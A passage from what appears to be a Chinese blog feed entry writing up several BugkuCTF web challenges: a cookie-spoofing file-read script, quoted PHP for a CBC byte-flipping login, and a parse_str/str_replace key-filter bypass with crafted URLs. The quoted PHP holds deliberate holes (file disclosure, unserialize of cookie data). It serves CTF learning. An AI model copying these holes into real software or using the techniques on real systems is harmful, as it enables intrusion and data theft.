post).text)</span><br></pre></td></tr></table></figure><p>不过还是没搞出来。</p><hr><p>复习一下<code>requests</code>库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#构造requests对象</span></span><br><span class="line"></span><br><span class="line">s = requests.get(url)</span><br><span class="line">s.post(url,   )</span><br><span class="line"></span><br><span class="line"><span class="comment">#差不多就这些了</span></span><br></pre></td></tr></table></figure><h1 id="cookies欺骗"><a href="#cookies欺骗" class="headerlink" title="cookies欺骗"></a>cookies欺骗</h1><p><img src="https://upload-images.jianshu.io/upload_images/10651191-ef56d1734bae0225.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="题目"></p><p>然而注意到URL中的line和file时就能做出来了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用脚本把代码跑出来</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">a=<span class="number">30</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(a):</span><br><span class="line">    url=<span class="string">"http://120.24.86.145:8002/web11/index.php?line="</span>+str(i)+<span class="string">"&amp;filename=aW5kZXgucGhw"</span> </span><br><span class="line">    s=requests.get(url)</span><br><span class="line">    <span class="keyword">print</span> s.text</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;       <span class="comment">//看这里</span></span><br><span class="line"> $file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line">$fa = file($file);</span><br><span class="line"><span class="keyword">echo</span> $fa[$line];</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造cookie就行啦<br>（然而没搞出flag来）</p><h1 id="login4"><a href="#login4" class="headerlink" title="login4"></a>login4</h1><p>CBC字节翻转攻击<br>放一张经典的图<br><img src="https://upload-images.jianshu.io/upload_images/5035860-05d52e6d3d0061b3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1000/format/webp" alt="CBC"></p><p>据师傅们的wp说是有一个index.php.swp文件存在。<br>然而没找到， 先把师傅们找到的源码放上来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, file_get_contents(<span class="string">'/root/key'</span>));</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $random_iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">    setcookie(<span class="string">"iv"</span>, base64_encode($iv));</span><br><span class="line">    setcookie(<span class="string">"cipher"</span>, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_login</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'cipher'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[<span class="string">'cipher'</span>]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[<span class="string">"iv"</span>]);</span><br><span class="line">        <span class="keyword">if</span>($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"&lt;p&gt;base64_decode('"</span>.base64_encode($plain).<span class="string">"') can't unserialize&lt;/p&gt;"</span>);</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"ERROR!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">"username"</span>]===<span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Hello admin&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Flag is $flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;hello '</span>.$_SESSION[<span class="string">'username'</span>].<span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Only admin can see flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    $username = (string)$_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = (string)$_POST[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span>($username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'&lt;p&gt;admin are not allowed to login&lt;/p&gt;'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        info = <span class="keyword">array</span>(<span class="string">'username'</span>=&gt;username,<span class="string">'password'</span>=&gt;password);</span><br><span class="line">        login(info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">"username"</span>]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;body class="login-body"&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                &lt;div id="wrapper"&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class="user-icon"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class="pass-icon"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;form name="login-form" class="login-form" action="" method="post"&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="header"&gt;</span></span><br><span class="line"><span class="string">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="content"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="footer"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type="submit" name="submit" value="Login" class="button" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h1 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h1><p>根据以前做题的经验， 备份就是在提示你 存在bak文件<br>所以直接输入URL为 <code>http://123.206.87.240:8002/web16/index.php.bak</code> 然后下载文件<br>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line">$str = substr($str,<span class="number">1</span>);</span><br><span class="line">$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>做代码审计的题目， 还是主要靠自己尝试。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$str = strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$str"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$str = substr($str, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$str"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>, $str);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$str"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">parse_str($str);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$key1"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'flag'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面是我用来测试的代码</p><p>构造URL为 <code>http://localhost/test/test.php?kkeyey1=1&amp;kkeyey2=2</code><br>输出了这些：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?kkeyey1=1&amp;kkeyey2=2</span><br><span class="line">kkeyey1=1&amp;kkeyey2=2</span><br><span class="line">key1=1&amp;key2=2</span><br><span class="line">1</span><br><span class="line">c4ca4238a0b923820dcc509a6f75849b</span><br><span class="line">c81e728d9d4c2f636f067f89cc14862c</span><br></pre></td></tr></table></figure></p><p>之前还很疑惑为什么没有get都能得到变量， 原来是<code>parse_str</code>这个函数在起作用。</p><p>OK， 现在就是表演的时间了。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://blog.csdn.net/wy_97/article/details/77431111" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/77431111</a><br><a href="https://www.cnblogs.com/Pinging/p/8278168.html" target="_blank" rel="noopener">https://www.cnblogs.com/Pinging/p/8278168.html</a><br><a href="https://blog.csdn.net/qq_19861715/article/details/79384018" target="_blank" rel="noopener">https://blog.csdn.net/qq_19861715/article/details/79384018</a></p><p><a href="https://blog.csdn.net/qq_39629343/article/details/80696263" target="_blank" rel="noopener">https://blog.csdn.net/qq_39629343/article/details/80696263</a></p><p><a href="https://www.jianshu.com/p/b0a5d72c8bae" target="_blank" rel="noopener">秋名山老司机</a><br><a href="https://blog.csdn.net/qq_26090065/article/details/81588595" target="_blank" rel="noopener">cookie欺骗</a><br><a href="https://blog.csdn.net/csu_vc/article/details/79619309" target="_blank" rel="noopener">CBC字节翻转攻击</a></p><p><a href="https://www.cnblogs.com/EvileOn/p/5517235.html" target="_blank" rel="noopener">python requests库学习</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;welcome-to-bugkuctf&quot;&gt;&lt;a href=&quot;#welcome-to-bugkuctf&quot; class=&quot;headerlink&quot; title=&quot;welcome to bugkuctf&quot;&gt;&lt;/a&gt;welcome to bugkuctf&lt;/h1&gt;&lt;p&gt;&lt;i
      
    
    </summary>
    
      <category term="bugkuctf" scheme="https://prontosil.club/categories/bugkuctf/"/>
    
    
      <category term="wp" scheme="https://prontosil.club/tags/wp/"/>
    
  </entry>
  
</feed>
